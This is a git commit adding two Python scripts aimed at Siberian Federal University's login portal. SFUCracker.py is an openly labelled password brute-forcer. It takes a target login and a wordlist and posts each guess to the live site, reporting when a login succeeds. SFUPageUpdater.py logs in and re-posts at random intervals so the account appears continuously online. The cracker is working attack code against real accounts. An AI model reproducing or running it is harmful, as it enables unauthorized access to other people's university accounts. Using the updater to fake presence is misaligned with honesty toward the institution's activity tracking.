0cd2c6bdb019fc6b8212d73f99be652a3de7717e
Aleksey <sidorenkoalekse@mail.ru>
2020-04-11 14:30:45 +0700

    Add files via upload

---
+++ sfu_tools/SFUCracker.py
@@ -0,0 +1,60 @@
+#!/usr/bin/python3
+#Script to bruteforce password to sfu-kras accounts
+import sys
+import requests
+import colorama
+from colorama import Fore, Back, Style
+from bs4 import BeautifulSoup
+
+LOGIN 		= str(input('\nEnter SFU-login:  '))
+PASSWORD_LIST 	= str(input('Password''s list:   '))
+AUTH_URL	= 'https://i.sfu-kras.ru'
+
+
+def connect():
+	if requests.get(AUTH_URL).status_code == 200:
+		print(Fore.GREEN + 'URL is online!')
+		print(Style.RESET_ALL)
+		return True
+	else:
+		print(Fore.RED + 'Error! URL is offline!\n')
+		return False
+
+def parse_html(brute_data):
+	html_page   = requests.post(AUTH_URL, brute_data).text
+	soup_object = BeautifulSoup(html_page, 'lxml')
+	try:
+		get_user = soup_object.find('span', id = 'user-name').text
+		print(Fore.GREEN + 'User found: ' + str(get_user))
+		print(Fore.GREEN + 'Password found: ' + str(brute_data['USER_PASSWORD']))
+		print(Style.RESET_ALL)
+		return False
+	except:
+		return True
+
+def bruteforce(pass_list):
+	with open(pass_list, 'r') as list:
+		pass_num = 1
+		print('Bruteforce is starting ...\n')
+		for brute_password in list:
+			print('Password ' + str(pass_num) + ': ' + brute_password)
+			DATA = {'AUTH_FORM'     : 'Y',
+        			'TYPE'          : 'AUTH',
+        			'backurl'       : '/index.php',
+        			'USER_LOGIN'    : LOGIN,
+        			'USER_PASSWORD' : brute_password.strip()}
+			if parse_html(DATA):
+				pass
+			else:
+				sys.exit()
+			pass_num += 1
+		print(Fore.RED + 'Password not found!\n')
+
+def main():
+	if connect():
+		bruteforce(PASSWORD_LIST)
+	else:
+		pass
+
+if __name__ == '__main__':
+	main()
---
+++ sfu_tools/SFUPageUpdater.py
@@ -0,0 +1,61 @@
+#!/usr/bin/python3
+#Script to update html page on sfu sites
+#Default updating one time in (1 - 3) min
+#По умолчанию - скрипт посылает POST запрос на сайт один раз в (1 - 4) минуты
+import sys
+import random
+import colorama
+import requests
+import datetime, time
+from colorama import Fore, Back, Style
+from bs4 import BeautifulSoup
+
+LOGIN	 = str(input('\nEnter SFU-login:    '))
+PASSWORD = str(input('Enter SFU-password:  '))
+AUTH_URL = 'https://i.sfu-kras.ru'
+
+DATA = {'AUTH_FORM'	: 'Y',
+	'TYPE'		: 'AUTH',
+	'backurl'	: '/index.php',
+	'USER_LOGIN'	: LOGIN,
+	'USER_PASSWORD'	: PASSWORD}
+
+session = requests.Session()
+
+
+def get_online_status():
+	html_page	= session.post(AUTH_URL, DATA).text
+	soup_object	= BeautifulSoup(html_page, 'lxml')
+	user_online     = soup_object.find('span', id = 'user-name').text
+	return str(user_online)
+
+
+def post_request():
+	try:
+		print(Fore.GREEN + get_online_status() + ' - Online\n')
+	except:
+		print(Fore.RED + 'WRONG LOGIN OR PASSWORD! PLEASE CHECK IT.\n')
+		sys.exit()
+	while True:
+		SYSTEM_TIME  = datetime.datetime.now()
+		CURRENT_TIME = SYSTEM_TIME.strftime('%X')
+		if session.post(AUTH_URL, DATA):
+			print(Fore.GREEN + str(CURRENT_TIME + ' - REQUEST IS SENT!'))
+		else:
+			print(Fore.RED + 'ERROR REQUEST IS NOT SENT!')
+
+		time_range = random.randint(60, 240)
+		time.sleep(time_range)
+
+
+if requests.get(AUTH_URL).status_code == 200:
+	print(Fore.CYAN + 'URL is online! Connecting... \n')
+	if get_online_status != False:
+		post_request()
+	else:
+		print('Error!')
+else:
+	print(Fore.RED + 'Ups...error ' + str(requests.get(AUTH_URL).status_code))
+
+print(Style.RESET_ALL)
+
